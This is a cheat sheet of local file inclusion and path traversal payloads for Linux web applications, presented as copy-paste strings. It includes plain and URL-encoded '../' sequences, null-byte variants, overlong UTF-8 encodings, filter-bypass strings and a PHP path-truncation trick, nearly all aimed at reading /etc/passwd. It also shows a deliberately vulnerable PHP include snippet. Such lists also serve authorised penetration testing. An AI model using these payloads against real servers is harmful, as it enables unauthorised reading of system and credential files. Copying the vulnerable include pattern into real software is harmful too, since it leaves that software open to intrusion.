# LFI-Cheat-sheet - LINUX 
-------------------

**Quick Copy-Pastes:**

../
../../
../../../
../../../../
../../../../../
../../../etc/passwd
%2E%2F - Single URL Encode ./
%252E%252F - Double URL Encode ./
%2E%2E%2F - Single URL Encoded ../
%252E%252E%252F - Double URL Encoded ../
%2E%2E%2E%2E%2F%2F - Single URL Encode ....//

**traversal sequence stripped:**
....//....//....//etc/passwd
....\/....\/....\/etc/passwd
%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd

**Null Byte variations:**
%00
%00%00
%2500 - URL Encoded
 

**URL Encoded:**
..%252f..%252f..%252fetc%252fpasswd - double encode
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
%252e%252e%252fetc%252fpasswd
%252e%252e%252fetc%252fpasswd%00

**Traversal from existent folder:**
utils/scripts/(Any suspected path)../../../../../etc/passwd

**Truncated paths -** PHP will drop anything after 4096 bytes.
assuming a php code that tries to append ".php" to the included parameter, truncated path can be used
to forcefully ommit ".php" from the parameter to allow path traversal with a normal path, ex: /etc/passwd
<?php
include("includes/".$_GET['param1'].".php");
?>
ex:../../../etc/passwd../././././././<x4096 repetitions of "./"> .php  >> ".php" will be dropped might by pass the above code.
./ - can be substitued with other symbols or dots.

**Filter Bypass Tricks:**
....//....//etc/passwd
..///////..////..//////etc/passwd
/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
/var/www/../../etc/passwd





